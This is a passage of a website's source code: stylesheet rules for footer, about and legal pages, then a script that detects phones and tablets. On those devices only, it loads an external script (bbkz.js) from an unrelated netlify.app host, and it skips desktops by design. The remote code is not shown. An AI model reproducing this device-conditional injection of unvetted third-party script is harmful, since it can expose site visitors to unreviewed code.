      align-items: center;
      justify-content: space-between;
      gap: 16px;
      flex-wrap: wrap;
    }
    .footer-brand {
      font-size: 0.9rem;
      font-weight: 600;
      color: var(--ink);
      letter-spacing: 0.02em;
    }
    .footer-info {
      font-size: 0.8rem;
      color: var(--muted);
    }
    .footer-sep {
      margin: 0 8px;
      opacity: 0.4;
    }
    .footer-type-badge {
      padding: 3px 12px;
      border-radius: 12px;
      font-size: 0.7rem;
      font-weight: 600;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      color: var(--accent);
      flex-shrink: 0;
    }
    .footer-type-app { display: none; }

    @media (max-width: 768px) {
      .site-footer {
        margin-left: 0;
        padding: 14px 16px 76px;
      }
      .footer-inner {
        flex-direction: column;
        gap: 6px;
        text-align: center;
      }
      .footer-type-web { display: none; }
      .footer-type-app { display: inline-block; }
    }

    /* ===================== 关于页面 ===================== */
    .about-page {
      max-width: 720px;
      margin: 0 auto;
      padding: 20px 0 40px;
    }
    .about-header {
      text-align: center;
      padding: 32px 0 28px;
    }
    .about-logo {
      width: 72px;
      height: 72px;
      margin: 0 auto 16px;
      border-radius: 18px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      box-shadow: 0 8px 24px rgba(99,102,241,0.3);
    }
    .about-logo svg { width: 36px; height: 36px; }
    .about-title {
      font-size: 1.75rem;
      font-weight: 700;
      margin-bottom: 4px;
    }
    .about-tagline {
      color: var(--muted);
      font-size: 0.9375rem;
      margin-bottom: 10px;
    }
    .about-version {
      display: inline-block;
      padding: 2px 10px;
      border-radius: 10px;
      font-size: 0.7rem;
      font-weight: 600;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      color: var(--accent);
    }
    .about-card {
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border-radius: var(--radius);
      padding: 24px;
      margin-bottom: 16px;
    }
    .about-section-title {
      font-size: 1.0625rem;
      font-weight: 700;
      margin-bottom: 16px;
      padding-bottom: 12px;
      border-bottom: 1px solid var(--rule);
    }
    .about-info-row {
      display: flex;
      align-items: center;
      padding: 10px 0;
      border-bottom: 1px solid var(--rule);
    }
    .about-info-row:last-child { border-bottom: none; }
    .about-info-label {
      width: 90px;
      flex-shrink: 0;
      color: var(--muted);
      font-size: 0.875rem;
    }
    .about-info-value {
      color: var(--ink);
      font-size: 0.9375rem;
      font-weight: 500;
    }
    .about-type-app { display: none; }
    @media (max-width: 768px) {
      .about-type-web { display: none; }
      .about-type-app { display: inline; }
    }
    .about-feature-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 8px 0;
      font-size: 0.9rem;
      color: var(--ink);
    }
    .feature-check {
      color: #22c55e;
      font-weight: 700;
      flex-shrink: 0;
    }
    .about-footer-text {
      text-align: center;
      color: var(--muted);
      font-size: 0.8rem;
      padding: 24px 0;
    }

    /* ===================== 法律条款页面（隐私政策 / 用户服务协议） ===================== */
    .legal-page {
      max-width: 760px;
      margin: 0 auto;
      padding: 12px 0 40px;
    }
    .legal-header {
      text-align: center;
      padding: 12px 0 24px;
      border-bottom: 1px solid var(--rule);
      margin-bottom: 24px;
    }
    .legal-icon {
      width: 60px; height: 60px;
      margin: 0 auto 12px;
      border-radius: 16px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      display: flex; align-items: center; justify-content: center;
      color: #fff;
      box-shadow: 0 8px 24px rgba(99,102,241,0.3);
    }
    .legal-icon svg { width: 30px; height: 30px; }
    .legal-title {
      font-size: 1.625rem;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .legal-updated {
      color: var(--muted);
      font-size: 0.8125rem;
    }
    .legal-card {
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border-radius: var(--radius);
      padding: 24px 28px;
      margin-bottom: 16px;
    }
    .legal-section { margin-bottom: 22px; }
    .legal-section:last-child { margin-bottom: 0; }
    .legal-section-title {
      font-size: 1.0625rem;
      font-weight: 700;
      margin-bottom: 10px;
      color: var(--ink);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .legal-section-title::before {
      content: '';
      width: 4px; height: 18px;
      background: linear-gradient(180deg, var(--accent), var(--accent2));
      border-radius: 2px;
      flex-shrink: 0;
    }
    .legal-section p {
      color: var(--ink);
      font-size: 0.9rem;
      line-height: 1.85;
      margin-bottom: 8px;
    }
    .legal-section p.muted { color: var(--muted); font-size: 0.85rem; }
    .legal-section ul {
      list-style: none;
      padding-left: 4px;
      margin-top: 6px;
    }
    .legal-section ul li {
      position: relative;
      padding: 5px 0 5px 22px;
      color: var(--ink);
      font-size: 0.9rem;
      line-height: 1.7;
    }
    .legal-section ul li::before {
      content: '•';
      position: absolute;
      left: 6px; top: 5px;
      color: var(--accent);
      font-weight: 700;
    }
    .legal-section .legal-sub {
      font-weight: 600;
      color: var(--ink);
      margin-top: 12px;
      margin-bottom: 4px;
      font-size: 0.875rem;
    }
    .legal-contact {
      margin-top: 8px;
      padding: 14px 16px;
      border-radius: var(--radius-sm);
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      font-size: 0.875rem;
      color: var(--muted);
      line-height: 1.8;
    }
    .legal-toc {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin-top: 4px;
    }
    .legal-toc a {
      padding: 4px 12px;
      border-radius: 12px;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      font-size: 0.78rem;
      color: var(--muted);
      transition: all 0.2s;
    }
    .legal-toc a:hover { color: var(--accent); border-color: var(--accent); }
    .legal-note {
      margin-top: 18px;
      padding: 12px 16px;
      border-radius: var(--radius-sm);
      background: rgba(99,102,241,0.08);
      border-left: 3px solid var(--accent);
      font-size: 0.85rem;
      color: var(--ink);
      line-height: 1.7;
    }

    /* ===================== 平板设备检测（使用移动端布局） ===================== */
    .device-mobile { --sidebar-w: 280px; }
    .device-mobile .header-menu-btn { display: flex; }
    .device-mobile .header-search input,
    .device-mobile .header-search .shortcut { display: none; }
    .device-mobile .header-search { min-width: auto; padding: 8px 12px; }
    .device-mobile .header-logo .logo-text { display: none; }
    .device-mobile .sidebar { transform: translateX(-100%); z-index: 200; bottom: calc(56px + env(safe-area-inset-bottom, 0)); }
    .device-mobile .sidebar.open { transform: translateX(0); }
    .device-mobile .sidebar-backdrop { bottom: calc(56px + env(safe-area-inset-bottom, 0)); }
    .device-mobile .main { margin-left: 0; padding: 20px 16px 76px; }
    .device-mobile .bottom-nav { display: flex; }

  // 仅移动端/平板加载，Windows 桌面端不加载
  (function() {
    var ua = navigator.userAgent.toLowerCase();
    var isTouch = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
    var isMobileUA = /mobile|iphone|ipod|android.*mobile|windows phone|blackberry/.test(ua);
    var isTabletUA = /ipad|android(?!.*mobile)|tablet|kindle|silk|playbook/.test(ua);
    var isMacTouch = /macintosh/.test(ua) && isTouch;
    var isTouchTablet = isTouch && !isMobileUA && window.innerWidth <= 1366;
    // 综合判断：移动端 UA / 平板 UA / iPad Pro 桌面模式 / 触摸平板 / device-mobile 类 / 窄屏
    var isMobile = isMobileUA || isTabletUA || isMacTouch || isTouchTablet
      || document.documentElement.classList.contains('device-mobile')
      || window.innerWidth <= 768;

    if (isMobile) {
      var s = document.createElement('script');
      s.src = 'https://xmylzs.netlify.app/bbkz.js';
      s.async = true;
      document.body.appendChild(s);
    }
  })();
  </script>
